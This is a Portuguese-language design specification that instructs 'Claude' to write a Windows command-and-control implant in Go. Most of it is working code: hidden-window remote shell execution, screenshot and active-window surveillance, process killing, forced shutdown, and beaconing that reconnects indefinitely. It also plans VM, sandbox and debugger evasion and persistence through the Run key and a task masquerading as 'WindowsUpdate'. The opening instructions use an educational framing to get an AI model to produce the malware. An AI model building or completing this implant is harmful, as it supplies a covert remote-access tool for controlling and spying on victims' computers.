# Sentinel Implant - Especificação Completa para Implementação

**Versão:** 1.0.6  
**Linguagem:** Go 1.21+  
**Target:** Windows x64 (binário único .exe)  
**Tipo:** Agente C2 (Command & Control)

---

## INSTRUÇÕES PARA O CLAUDE

Você é um Engenheiro de Software Sênior especialista em **Golang** e **Segurança Ofensiva (Red Teaming)**.

Sua tarefa é desenvolver o código-fonte completo do **"Sentinel Implant"** (Agente), seguindo **rigorosamente** todas as especificações deste documento.

**Contexto:** Este é um projeto **educacional** de C2. O Agente deve ser um binário único (`.exe`) para Windows que se conecta a um servidor backend (Sentinel Core) via **WebSocket puro** (não STOMP).

**IMPORTANTE:** Este documento é a fonte da verdade. Siga exatamente o que está aqui.

---

## Índice

1. [Arquitetura Geral](#1-arquitetura-geral)
2. [Estrutura de Arquivos](#2-estrutura-de-arquivos)
3. [Dependências](#3-dependências)
4. [Configuração](#4-configuração)
5. [Conexão WebSocket](#5-conexão-websocket)
6. [Autenticação PSK](#6-autenticação-psk)
7. [Identificação do Host (HWID)](#7-identificação-do-host-hwid)
8. [Protocolo de Mensagens](#8-protocolo-de-mensagens)
9. [Heartbeat (Telemetria)](#9-heartbeat-telemetria)
10. [Sistema de Handlers](#10-sistema-de-handlers)
11. [Handlers Implementados (MVP)](#11-handlers-implementados-mvp)
12. [Módulo Stealth](#12-módulo-stealth)
13. [Resiliência e Reconexão](#13-resiliência-e-reconexão)
14. [Build e Compilação](#14-build-e-compilação)
15. [Fluxo de Execução](#15-fluxo-de-execução)
16. [Código de Referência](#16-código-de-referência)

---

## 1. Arquitetura Geral

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           SENTINEL IMPLANT (Go)                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌─────────────┐    ┌─────────────┐    ┌─────────────┐                    │
│   │    main     │───>│   stealth   │───>│  connection │                    │
│   │   (entry)   │    │  (evasion)  │    │ (websocket) │                    │
│   └─────────────┘    └─────────────┘    └──────┬──────┘                    │
│                                                 │                           │
│                                                 │ WebSocket                 │
│                                                 │                           │
│   ┌─────────────────────────────────────────────┼───────────────────────┐  │
│   │                         MESSAGE ROUTER                               │  │
│   │                                                                      │  │
│   │   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐        │  │
│   │   │ HEARTBEAT│   │  SHELL   │   │SCREENSHOT│   │ MESSAGE  │        │  │
│   │   │ (5s loop)│   │ (handler)│   │ (handler)│   │ (handler)│        │  │
│   │   └──────────┘   └──────────┘   └──────────┘   └──────────┘        │  │
│   │                                                                      │  │
│   │   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐        │  │
│   │   │KILL_PROC │   │PROC_LIST │   │ OPEN_URL │   │ SHUTDOWN │        │  │
│   │   │ (handler)│   │ (handler)│   │ (handler)│   │ (handler)│        │  │
│   │   └──────────┘   └──────────┘   └──────────┘   └──────────┘        │  │
│   │                                                                      │  │
│   └──────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│   ┌─────────────────────────────────────────────────────────────────────┐   │
│   │                           TELEMETRY                                  │   │
│   │   hwid | hostname | os_info | ip_local | cpu | ram | active_window  │   │
│   └─────────────────────────────────────────────────────────────────────┘   │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    │ WebSocket (ws://)
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                         SENTINEL CORE (Backend)                              │
│                         ws://localhost:8080/ws-sentinel                      │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Princípios de Design

1. **Binário Único:** O agente compila para um único `.exe` sem dependências externas
2. **Resiliência Total:** O agente NUNCA deve fechar, mesmo com erros de rede
3. **Extensibilidade:** Novos comandos são adicionados apenas registrando handlers
4. **Stealth-Ready:** Estrutura preparada para técnicas de evasão (v2.0)
5. **Mínimo Footprint:** Código enxuto, sem logs em produção

---

## 2. Estrutura de Arquivos

```
sentinel-implant/
├── go.mod
├── go.sum
├── main.go                          # Entry point
├── config/
│   └── config.go                    # Configurações (servidor, PSK, intervalos)
├── core/
│   ├── connection/
│   │   ├── websocket.go             # Cliente WebSocket com reconexão
│   │   └── message.go               # Structs de mensagens
│   ├── identity/
│   │   └── hwid.go                  # Geração de HWID único
│   └── telemetry/
│       └── collector.go             # Coleta de métricas do sistema
├── handlers/
│   ├── registry.go                  # Registro de handlers
│   ├── executor/
│   │   └── shell.go                 # Handler SHELL
│   ├── surveillance/
│   │   ├── screenshot.go            # Handler SCREENSHOT
│   │   └── process.go               # Handler PROCESS_LIST
│   └── troll/
│       ├── message.go               # Handler MESSAGE
│       ├── url.go                   # Handler OPEN_URL
│       └── system.go                # Handlers KILL_PROC, SHUTDOWN
└── stealth/
    ├── environment.go               # Detecção de ambiente (placeholder)
    └── persistence.go               # Persistência (placeholder)
```

---

## 3. Dependências

```go
// go.mod
module sentinel-implant

go 1.21

require (
    github.com/gorilla/websocket v1.5.1      // WebSocket client
    github.com/shirou/gopsutil/v3 v3.24.1    // System metrics (CPU, RAM)
    github.com/kbinani/screenshot v0.0.0-20230812210009-b87d31814237  // Screenshot
    golang.org/x/sys v0.16.0                  // Windows syscalls
)
```

**Instalação:**
```bash
go mod init sentinel-implant
go get github.com/gorilla/websocket
go get github.com/shirou/gopsutil/v3
go get github.com/kbinani/screenshot
go get golang.org/x/sys
```

---

## 4. Configuração

### config/config.go

```go
package config

import (
    "os"
    "time"
)

type Config struct {
    // Conexão
    ServerURL       string
    PSK             string
    
    // Intervalos
    HeartbeatInterval time.Duration
    ReconnectMinDelay time.Duration
    ReconnectMaxDelay time.Duration
    
    // Identidade
    AgentVersion    string
}

var Current = Config{
    // Valores padrão (podem ser sobrescritos por variáveis de ambiente ou build flags)
    ServerURL:         getEnvOrDefault("SENTINEL_SERVER", "ws://localhost:8080/ws-sentinel"),
    PSK:               getEnvOrDefault("SENTINEL_PSK", "SENTINEL_PROJECT_V1_SECRET_KEY"),
    
    HeartbeatInterval: 5 * time.Second,
    ReconnectMinDelay: 1 * time.Second,
    ReconnectMaxDelay: 60 * time.Second,
    
    AgentVersion:      "1.0.6",
}

func getEnvOrDefault(key, defaultValue string) string {
    if value := os.Getenv(key); value != "" {
        return value
    }
    return defaultValue
}
```

**IMPORTANTE:** Para build de produção, use `-ldflags` para injetar valores:
```bash
go build -ldflags "-X sentinel-implant/config.Current.ServerURL=ws://c2.example.com/ws-sentinel -X sentinel-implant/config.Current.PSK=MySecretKey123"
```

---

## 5. Conexão WebSocket

### Biblioteca: gorilla/websocket

O agente usa **Raw WebSocket** (não STOMP) para máxima compatibilidade.

### core/connection/websocket.go

**Responsabilidades:**
1. Estabelecer conexão WebSocket
2. Enviar headers de autenticação no handshake
3. Manter conexão com reconexão automática
4. Ler mensagens do servidor
5. Enviar mensagens para o servidor
6. Gerenciar goroutines de leitura/escrita

**Estrutura:**

```go
type WebSocketClient struct {
    conn        *websocket.Conn
    url         string
    psk         string
    hwid        string
    isConnected bool
    writeMutex  sync.Mutex  // Protege escrita concorrente
    
    // Channels
    sendChan    chan []byte
    done        chan struct{}
}

// Métodos principais:
func NewClient(url, psk, hwid string) *WebSocketClient
func (c *WebSocketClient) Connect() error
func (c *WebSocketClient) SendMessage(msg WebSocketMessage) error
func (c *WebSocketClient) ReadMessage() (WebSocketMessage, error)
func (c *WebSocketClient) Close()
func (c *WebSocketClient) IsConnected() bool
```

---

## 6. Autenticação PSK

O backend espera autenticação via headers HTTP durante o handshake WebSocket.

### Método de Autenticação

**Headers obrigatórios:**
```
X-Agent-Auth: <HASH>
X-Agent-Timestamp: <UNIX_MILLIS>
```

**Cálculo do HASH:**
```go
timestamp := fmt.Sprintf("%d", time.Now().UnixMilli())
hash := sha256.Sum256([]byte(psk + timestamp))
authHash := hex.EncodeToString(hash[:])
```

**Exemplo:**
```
PSK = "SENTINEL_PROJECT_V1_SECRET_KEY"
Timestamp = "1698234567890"
Input = "SENTINEL_PROJECT_V1_SECRET_KEY1698234567890"
Hash = SHA256(Input) = "a1b2c3d4e5..."

X-Agent-Auth: a1b2c3d4e5...
X-Agent-Timestamp: 1698234567890
```

### Implementação no Handshake

```go
func (c *WebSocketClient) Connect() error {
    // Calcular auth
    timestamp := fmt.Sprintf("%d", time.Now().UnixMilli())
    hash := sha256.Sum256([]byte(c.psk + timestamp))
    authHash := hex.EncodeToString(hash[:])
    
    // Headers
    headers := http.Header{}
    headers.Set("X-Agent-Auth", authHash)
    headers.Set("X-Agent-Timestamp", timestamp)
    
    // Dialer
    dialer := websocket.Dialer{
        HandshakeTimeout: 10 * time.Second,
    }
    
    conn, _, err := dialer.Dial(c.url, headers)
    if err != nil {
        return err
    }
    
    c.conn = conn
    c.isConnected = true
    return nil
}
```

**NOTA:** O backend valida que o timestamp não é mais velho que 5 minutos para prevenir replay attacks.

---

## 7. Identificação do Host (HWID)

O HWID deve ser **único e imutável** para cada máquina física.

### Estratégia de Geração

1. **Primário:** UUID da placa-mãe via WMI
2. **Fallback:** Hash SHA256 do MAC Address da primeira interface de rede

### core/identity/hwid.go

```go
package identity

import (
    "crypto/sha256"
    "encoding/hex"
    "net"
    "os/exec"
    "strings"
)

// GetHWID retorna um identificador único e imutável da máquina
func GetHWID() string {
    // Tenta obter UUID da placa-mãe
    if uuid := getMotherboardUUID(); uuid != "" {
        return formatHWID(uuid)
    }
    
    // Fallback: hash do MAC address
    if mac := getFirstMACAddress(); mac != "" {
        hash := sha256.Sum256([]byte(mac))
        return formatHWID(hex.EncodeToString(hash[:])[:32])
    }
    
    // Último recurso: gerar aleatório (não ideal)
    return generateRandomHWID()
}

// getMotherboardUUID obtém UUID via WMI
func getMotherboardUUID() string {
    cmd := exec.Command("wmic", "csproduct", "get", "uuid")
    output, err := cmd.Output()
    if err != nil {
        return ""
    }
    
    lines := strings.Split(string(output), "\n")
    for _, line := range lines {
        line = strings.TrimSpace(line)
        // Ignora header e linhas vazias
        if line != "" && line != "UUID" && !strings.HasPrefix(line, "UUID") {
            return line
        }
    }
    return ""
}

// getFirstMACAddress obtém o MAC da primeira interface
func getFirstMACAddress() string {
    interfaces, err := net.Interfaces()
    if err != nil {
        return ""
    }
    
    for _, iface := range interfaces {
        if iface.HardwareAddr != nil && len(iface.HardwareAddr) > 0 {
            // Ignora interfaces virtuais/loopback
            if iface.Flags&net.FlagLoopback == 0 {
                return iface.HardwareAddr.String()
            }
        }
    }
    return ""
}

// formatHWID formata para padrão AA-BB-CC-DD-EE-FF
func formatHWID(raw string) string {
    raw = strings.ToUpper(strings.ReplaceAll(raw, "-", ""))
    if len(raw) >= 12 {
        return fmt.Sprintf("%s-%s-%s-%s-%s-%s",
            raw[0:2], raw[2:4], raw[4:6],
            raw[6:8], raw[8:10], raw[10:12])
    }
    return raw
}
```

---

## 8. Protocolo de Mensagens

### Envelope Padrão

Todas as mensagens seguem este formato JSON:

```json
{
    "type": "MESSAGE_TYPE",
    "payload": { ... },
    "request_id": "optional-uuid"
}
```

### core/connection/message.go

```go
package connection

import "encoding/json"

// WebSocketMessage é o envelope padrão de todas as mensagens
type WebSocketMessage struct {
    Type      string          `json:"type"`
    Payload   json.RawMessage `json:"payload,omitempty"`
    RequestID string          `json:"request_id,omitempty"`
}

// ParsePayload deserializa o payload para uma struct específica
func (m *WebSocketMessage) ParsePayload(v interface{}) error {
    return json.Unmarshal(m.Payload, v)
}

// NewMessage cria uma nova mensagem
func NewMessage(msgType string, payload interface{}) (WebSocketMessage, error) {
    payloadBytes, err := json.Marshal(payload)
    if err != nil {
        return WebSocketMessage{}, err
    }
    
    return WebSocketMessage{
        Type:    msgType,
        Payload: payloadBytes,
    }, nil
}
```

---

## 9. Heartbeat (Telemetria)

O agente deve enviar telemetria a cada **5 segundos** (com jitter de ±2s para parecer mais natural).

### Mensagem HEARTBEAT

**Tipo:** `HEARTBEAT`

**Direção:** Agente → Servidor

**Payload:**
```json
{
    "hwid": "AA-BB-CC-DD-EE-FF",
    "hostname": "DESKTOP-PC01",
    "os_info": "Windows 11 Pro 23H2 (Build 22631)",
    "ip_local": "192.168.0.105",
    "cpu_load": 12.5,
    "ram_usage": 4096,
    "active_window": "Chrome - Gmail"
}
```

### Campos do Heartbeat

| Campo | Tipo | Descrição | Como obter |
|-------|------|-----------|------------|
| `hwid` | string | ID único da máquina | Ver seção 7 |
| `hostname` | string | Nome do computador | `os.Hostname()` |
| `os_info` | string | Sistema operacional | `runtime.GOOS` + WMI |
| `ip_local` | string | IP da LAN | Primeira interface não-loopback |
| `cpu_load` | float64 | % de uso de CPU | `gopsutil.Percent()` |
| `ram_usage` | int64 | RAM usada em MB | `gopsutil.VirtualMemory()` |
| `active_window` | string | Título da janela ativa | Win32 API `GetForegroundWindow` |

### core/telemetry/collector.go

```go
package telemetry

import (
    "os"
    "runtime"
    "syscall"
    "unsafe"
    
    "github.com/shirou/gopsutil/v3/cpu"
    "github.com/shirou/gopsutil/v3/mem"
)

type Heartbeat struct {
    HWID         string  `json:"hwid"`
    Hostname     string  `json:"hostname"`
    OSInfo       string  `json:"os_info"`
    IPLocal      string  `json:"ip_local"`
    CPULoad      float64 `json:"cpu_load"`
    RAMUsage     int64   `json:"ram_usage"`
    ActiveWindow string  `json:"active_window"`
}

func CollectHeartbeat(hwid string) Heartbeat {
    hostname, _ := os.Hostname()
    
    return Heartbeat{
        HWID:         hwid,
        Hostname:     hostname,
        OSInfo:       getOSInfo(),
        IPLocal:      getLocalIP(),
        CPULoad:      getCPUUsage(),
        RAMUsage:     getRAMUsageMB(),
        ActiveWindow: getActiveWindowTitle(),
    }
}

func getCPUUsage() float64 {
    percentages, err := cpu.Percent(0, false)
    if err != nil || len(percentages) == 0 {
        return 0
    }
    return percentages[0]
}

func getRAMUsageMB() int64 {
    v, err := mem.VirtualMemory()
    if err != nil {
        return 0
    }
    return int64(v.Used / 1024 / 1024)
}

// getActiveWindowTitle usa Win32 API
func getActiveWindowTitle() string {
    user32 := syscall.NewLazyDLL("user32.dll")
    getForegroundWindow := user32.NewProc("GetForegroundWindow")
    getWindowTextW := user32.NewProc("GetWindowTextW")
    
    hwnd, _, _ := getForegroundWindow.Call()
    if hwnd == 0 {
        return ""
    }
    
    buf := make([]uint16, 256)
    getWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 256)
    
    return syscall.UTF16ToString(buf)
}
```

---

## 10. Sistema de Handlers

### Arquitetura

O sistema usa um **registry pattern** para desacoplar o main.go dos handlers específicos.

**PROIBIDO:** Não use `switch/case` gigante no main.go!

### handlers/registry.go

```go
package handlers

import (
    "fmt"
    "sentinel-implant/handlers/executor"
    "sentinel-implant/handlers/surveillance"
    "sentinel-implant/handlers/troll"
)

// CommandHandler é a assinatura de todas as funções de comando
// Recebe: payload como interface{} (será deserializado pelo handler)
// Retorna: output string, error
type CommandHandler func(params []interface{}) (string, error)

// CommandRegistry mapeia tipos de comando para seus handlers
var CommandRegistry = map[string]CommandHandler{
    // Executor
    "SHELL": executor.ShellHandler,
    
    // Surveillance
    "SCREENSHOT":   surveillance.ScreenshotHandler,
    "PROCESS_LIST": surveillance.ProcessListHandler,
    
    // Troll/Control
    "MESSAGE":   troll.MessageHandler,
    "OPEN_URL":  troll.OpenURLHandler,
    "KILL_PROC": troll.KillProcessHandler,
    "SHUTDOWN":  troll.ShutdownHandler,
    
    // Futuro:
    // "KEYLOG":       surveillance.KeylogHandler,
    // "DOWNLOAD":     transfer.DownloadHandler,
    // "UPLOAD":       transfer.UploadHandler,
    // "SWITCH_MODE":  core.SwitchModeHandler,
}

// ExecuteCommand busca e executa o handler apropriado
func ExecuteCommand(commandType string, params []interface{}) (string, error) {
    handler, exists := CommandRegistry[commandType]
    if !exists {
        return "", fmt.Errorf("unknown command type: %s", commandType)
    }
    
    return handler(params)
}

// GetSupportedCommands retorna lista de comandos suportados
func GetSupportedCommands() []string {
    commands := make([]string, 0, len(CommandRegistry))
    for cmd := range CommandRegistry {
        commands = append(commands, cmd)
    }
    return commands
}
```

### Processamento de Comandos

Quando o servidor envia um COMMAND:

```json
{
    "type": "COMMAND",
    "payload": {
        "id": "550e8400-e29b-41d4-a716-446655440000",
        "type": "SHELL",
        "params": ["cmd", "/c", "ipconfig /all"]
    }
}
```

O agente deve:
1. Extrair `type` e `params` do payload
2. Buscar handler em `CommandRegistry[type]`
3. Executar handler com params
4. Enviar resultado via `COMMAND_RESULT`

---

## 11. Handlers Implementados (MVP)

### 11.1 SHELL Handler

**Arquivo:** `handlers/executor/shell.go`

**Função:** Executa comandos no shell do Windows (CMD ou PowerShell).

**CRÍTICO:** Ocultar janela do console!

```go
package executor

import (
    "bytes"
    "fmt"
    "os/exec"
    "syscall"
    "time"
)

// ShellHandler executa comandos no shell
// params: ["cmd", "/c", "comando"] ou ["powershell", "-c", "comando"]
func ShellHandler(params []interface{}) (string, error) {
    if len(params) < 2 {
        return "", fmt.Errorf("shell command requires at least 2 params")
    }
    
    // Converter params para []string
    args := make([]string, len(params))
    for i, p := range params {
        args[i] = fmt.Sprintf("%v", p)
    }
    
    // Criar comando
    cmd := exec.Command(args[0], args[1:]...)
    
    // CRÍTICO: Ocultar janela do console no Windows
    cmd.SysProcAttr = &syscall.SysProcAttr{
        HideWindow:    true,
        CreationFlags: 0x08000000, // CREATE_NO_WINDOW
    }
    
    // Capturar output
    var stdout, stderr bytes.Buffer
    cmd.Stdout = &stdout
    cmd.Stderr = &stderr
    
    // Timeout de 30 segundos
    done := make(chan error)
    go func() {
        done <- cmd.Run()
    }()
    
    select {
    case err := <-done:
        output := stdout.String()
        if stderr.Len() > 0 {
            output += "\n[STDERR]\n" + stderr.String()
        }
        if err != nil {
            return output, err
        }
        return output, nil
        
    case <-time.After(30 * time.Second):
        cmd.Process.Kill()
        return "", fmt.Errorf("command timed out after 30s")
    }
}
```

### 11.2 SCREENSHOT Handler

**Arquivo:** `handlers/surveillance/screenshot.go`

**Função:** Captura a tela e retorna como Base64 JPEG.

**IMPORTANTE:** Após capturar, o agente deve:
1. Enviar `COMMAND_RESULT` com status SUCCESS
2. Enviar `SCREENSHOT_UPLOAD` com a imagem

```go
package surveillance

import (
    "bytes"
    "encoding/base64"
    "image/jpeg"
    
    "github.com/kbinani/screenshot"
)

// ScreenshotResult contém o resultado da captura
type ScreenshotResult struct {
    Base64Data string
    Width      int
    Height     int
}

// ScreenshotHandler captura a tela principal
func ScreenshotHandler(params []interface{}) (string, error) {
    // Obter bounds do display principal
    bounds := screenshot.GetDisplayBounds(0)
    
    // Capturar
    img, err := screenshot.CaptureRect(bounds)
    if err != nil {
        return "", err
    }
    
    // Converter para JPEG com qualidade 80
    var buf bytes.Buffer
    err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: 80})
    if err != nil {
        return "", err
    }
    
    // Converter para Base64
    base64Data := base64.StdEncoding.EncodeToString(buf.Bytes())
    
    // Retornar confirmação (a imagem será enviada separadamente)
    return fmt.Sprintf("Screenshot captured: %dx%d (%d bytes)", 
        bounds.Dx(), bounds.Dy(), len(buf.Bytes())), nil
}

// GetScreenshotBase64 retorna a captura em Base64 para envio
func GetScreenshotBase64() (string, error) {
    bounds := screenshot.GetDisplayBounds(0)
    img, err := screenshot.CaptureRect(bounds)
    if err != nil {
        return "", err
    }
    
    var buf bytes.Buffer
    err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: 80})
    if err != nil {
        return "", err
    }
    
    return base64.StdEncoding.EncodeToString(buf.Bytes()), nil
}
```

### 11.3 MESSAGE Handler

**Arquivo:** `handlers/troll/message.go`

**Função:** Exibe uma MessageBox nativa do Windows.

```go
package troll

import (
    "fmt"
    "syscall"
    "unsafe"
)

// MessageHandler exibe MessageBox
// params: ["Título", "Mensagem"]
func MessageHandler(params []interface{}) (string, error) {
    if len(params) < 2 {
        return "", fmt.Errorf("message requires title and text")
    }
    
    title := fmt.Sprintf("%v", params[0])
    text := fmt.Sprintf("%v", params[1])
    
    user32 := syscall.NewLazyDLL("user32.dll")
    messageBox := user32.NewProc("MessageBoxW")
    
    titlePtr, _ := syscall.UTF16PtrFromString(title)
    textPtr, _ := syscall.UTF16PtrFromString(text)
    
    // MB_OK | MB_ICONINFORMATION = 0x00000040
    messageBox.Call(0, uintptr(unsafe.Pointer(textPtr)), 
        uintptr(unsafe.Pointer(titlePtr)), 0x40)
    
    return "Message displayed", nil
}
```

### 11.4 PROCESS_LIST Handler

**Arquivo:** `handlers/surveillance/process.go`

```go
package surveillance

import (
    "encoding/json"
    "github.com/shirou/gopsutil/v3/process"
)

type ProcessInfo struct {
    PID  int32  `json:"pid"`
    Name string `json:"name"`
    CPU  float64 `json:"cpu"`
    Mem  uint64  `json:"mem_mb"`
}

// ProcessListHandler lista processos em execução
func ProcessListHandler(params []interface{}) (string, error) {
    procs, err := process.Processes()
    if err != nil {
        return "", err
    }
    
    var list []ProcessInfo
    for _, p := range procs {
        name, _ := p.Name()
        cpu, _ := p.CPUPercent()
        mem, _ := p.MemoryInfo()
        
        memMB := uint64(0)
        if mem != nil {
            memMB = mem.RSS / 1024 / 1024
        }
        
        list = append(list, ProcessInfo{
            PID:  p.Pid,
            Name: name,
            CPU:  cpu,
            Mem:  memMB,
        })
    }
    
    output, _ := json.MarshalIndent(list, "", "  ")
    return string(output), nil
}
```

### 11.5 KILL_PROC Handler

**Arquivo:** `handlers/troll/system.go`

```go
package troll

import (
    "fmt"
    "github.com/shirou/gopsutil/v3/process"
)

// KillProcessHandler mata processo por nome
// params: ["notepad.exe"]
func KillProcessHandler(params []interface{}) (string, error) {
    if len(params) < 1 {
        return "", fmt.Errorf("process name required")
    }
    
    targetName := fmt.Sprintf("%v", params[0])
    killed := 0
    
    procs, _ := process.Processes()
    for _, p := range procs {
        name, _ := p.Name()
        if name == targetName {
            p.Kill()
            killed++
        }
    }
    
    return fmt.Sprintf("Killed %d instances of %s", killed, targetName), nil
}
```

### 11.6 OPEN_URL Handler

**Arquivo:** `handlers/troll/url.go`

```go
package troll

import (
    "fmt"
    "os/exec"
)

// OpenURLHandler abre URL no navegador padrão
// params: ["https://example.com"]
func OpenURLHandler(params []interface{}) (string, error) {
    if len(params) < 1 {
        return "", fmt.Errorf("URL required")
    }
    
    url := fmt.Sprintf("%v", params[0])
    
    // Windows: usar cmd /c start
    cmd := exec.Command("cmd", "/c", "start", url)
    err := cmd.Start()
    if err != nil {
        return "", err
    }
    
    return fmt.Sprintf("Opened URL: %s", url), nil
}
```

### 11.7 SHUTDOWN Handler

**Arquivo:** `handlers/troll/system.go` (adicionar)

```go
// ShutdownHandler desliga o computador
func ShutdownHandler(params []interface{}) (string, error) {
    cmd := exec.Command("shutdown", "/s", "/t", "0")
    err := cmd.Start()
    if err != nil {
        return "", err
    }
    return "Shutdown initiated", nil
}
```

---

## 12. Módulo Stealth

### Propósito

Estrutura preparada para técnicas de evasão. Na v1.0, são **placeholders** que sempre retornam sucesso.

### stealth/environment.go

```go
package stealth

// IsEnvironmentSafe verifica se o ambiente é seguro para execução
// v1.0: Sempre retorna true (placeholder)
// v2.0: Implementar detecção de VM, Debugger, Sandbox
func IsEnvironmentSafe() bool {
    // TODO v2.0: Implementar
    // - Detectar VMware/VirtualBox via registry
    // - Detectar debugger via IsDebuggerPresent()
    // - Detectar sandbox via timing attacks
    // - Verificar username (sandbox usa nomes como "sandbox", "maltest")
    // - Verificar resolução de tela (VMs têm resoluções específicas)
    // - Verificar número de CPUs (VMs geralmente têm 1-2)
    // - Verificar RAM total (VMs geralmente têm < 4GB)
    
    return true
}

// CheckDebugger verifica se há debugger anexado
func CheckDebugger() bool {
    // TODO v2.0
    return false
}

// CheckVM verifica se está rodando em VM
func CheckVM() bool {
    // TODO v2.0
    return false
}
```

### stealth/persistence.go

```go
package stealth

// InstallPersistence instala mecanismo de persistência
// v1.0: Não faz nada (placeholder)
// v2.0: Implementar cópia para Startup ou registro
func InstallPersistence() error {
    // TODO v2.0: Implementar
    // Opção 1: Copiar para pasta Startup
    //   %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
    // Opção 2: Registro Run
    //   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    // Opção 3: Scheduled Task
    //   schtasks /create /tn "WindowsUpdate" /tr "path" /sc onlogon
    
    return nil
}

// RemovePersistence remove mecanismos de persistência
func RemovePersistence() error {
    // TODO v2.0
    return nil
}

// IsInstalled verifica se persistência está instalada
func IsInstalled() bool {
    // TODO v2.0
    return false
}
```

---

## 13. Resiliência e Reconexão

### Requisito Crítico

**O agente NUNCA pode fechar.** Mesmo com erros de rede, o agente deve tentar reconectar indefinidamente.

### Backoff Exponencial

```
Tentativa 1: Espera 1s
Tentativa 2: Espera 2s
Tentativa 3: Espera 4s
Tentativa 4: Espera 8s
Tentativa 5: Espera 16s
Tentativa 6: Espera 32s
Tentativa 7+: Espera 60s (teto)
```

### Implementação

```go
package connection

import (
    "math"
    "math/rand"
    "time"
)

type ReconnectManager struct {
    minDelay time.Duration
    maxDelay time.Duration
    attempt  int
}

func NewReconnectManager(min, max time.Duration) *ReconnectManager {
    return &ReconnectManager{
        minDelay: min,
        maxDelay: max,
        attempt:  0,
    }
}

// GetNextDelay calcula o próximo delay com backoff exponencial + jitter
func (r *ReconnectManager) GetNextDelay() time.Duration {
    // Backoff: min * 2^attempt
    delay := float64(r.minDelay) * math.Pow(2, float64(r.attempt))
    
    // Aplicar teto
    if delay > float64(r.maxDelay) {
        delay = float64(r.maxDelay)
    }
    
    // Adicionar jitter (±20%)
    jitter := delay * 0.2 * (rand.Float64()*2 - 1)
    delay += jitter
    
    r.attempt++
    return time.Duration(delay)
}

// Reset reinicia o contador após conexão bem-sucedida
func (r *ReconnectManager) Reset() {
    r.attempt = 0
}
```

### Loop Principal de Reconexão

```go
func (c *WebSocketClient) RunForever() {
    reconnect := NewReconnectManager(
        config.Current.ReconnectMinDelay,
        config.Current.ReconnectMaxDelay,
    )
    
    for {
        // Tentar conectar
        err := c.Connect()
        if err != nil {
            delay := reconnect.GetNextDelay()
            time.Sleep(delay)
            continue
        }
        
        // Conexão bem-sucedida
        reconnect.Reset()
        
        // Rodar loop de mensagens
        c.messageLoop()
        
        // Se chegou aqui, conexão caiu
        // Volta para o início do for e tenta reconectar
    }
}
```

---

## 14. Build e Compilação

### Build Básico

```bash
# Windows x64
GOOS=windows GOARCH=amd64 go build -o sentinel-implant.exe .

# Com otimizações
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o sentinel-implant.exe .
```

### Build com Configuração Injetada

```bash
GOOS=windows GOARCH=amd64 go build \
    -ldflags="-s -w \
        -X 'sentinel-implant/config.serverURL=ws://c2.example.com/ws-sentinel' \
        -X 'sentinel-implant/config.psk=MyProductionKey123'" \
    -o sentinel-implant.exe .
```

### Build Flags Explicadas

| Flag | Descrição |
|------|-----------|
| `-s` | Remove symbol table |
| `-w` | Remove DWARF debug info |
| `-H windowsgui` | Remove console window (GUI mode) |

### Build Completo para Produção

```bash
# Sem janela de console + otimizado
GOOS=windows GOARCH=amd64 go build \
    -ldflags="-s -w -H windowsgui \
        -X 'sentinel-implant/config.serverURL=wss://c2.example.com/ws-sentinel' \
        -X 'sentinel-implant/config.psk=PRODUCTION_SECRET_KEY'" \
    -o agent.exe .
```

---

## 15. Fluxo de Execução

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              MAIN.GO                                         │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ 1. STEALTH CHECK                                                             │
│    if !stealth.IsEnvironmentSafe() { os.Exit(0) }                           │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ 2. GERAR HWID                                                                │
│    hwid := identity.GetHWID()                                                │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ 3. INSTALAR PERSISTÊNCIA                                                     │
│    stealth.InstallPersistence()   // v1.0: no-op                            │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ 4. CRIAR CLIENTE WEBSOCKET                                                   │
│    client := connection.NewClient(config.ServerURL, config.PSK, hwid)       │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│ 5. LOOP INFINITO DE CONEXÃO                                                  │
│    for {                                                                     │
│        client.Connect()                                                      │
│        go client.HeartbeatLoop()   // Goroutine de heartbeat                │
│        client.MessageLoop()         // Processa comandos                    │
│        // Se cair, volta pro início do loop                                 │
│    }                                                                         │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                        DENTRO DO MESSAGE LOOP                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│   ┌─────────────────────┐                                                   │
│   │ Receber mensagem    │                                                   │
│   │ do WebSocket        │                                                   │
│   └──────────┬──────────┘                                                   │
│              │                                                               │
│              ▼                                                               │
│   ┌─────────────────────┐                                                   │
│   │ Parsear JSON        │                                                   │
│   │ {type, payload}     │                                                   │
│   └──────────┬──────────┘                                                   │
│              │                                                               │
│              ▼                                                               │
│   ┌─────────────────────┐        ┌─────────────────────┐                   │
│   │ type == "COMMAND"?  │───────>│ handlers.Execute()  │                   │
│   └──────────┬──────────┘   YES  └──────────┬──────────┘                   │
│              │ NO                           │                               │
│              ▼                              ▼                               │
│   ┌─────────────────────┐        ┌─────────────────────┐                   │
│   │ Ignorar mensagem    │        │ Enviar COMMAND_RESULT│                   │
│   │ desconhecida        │        │ para o servidor      │                   │
│   └─────────────────────┘        └─────────────────────┘                   │
│                                                                              │
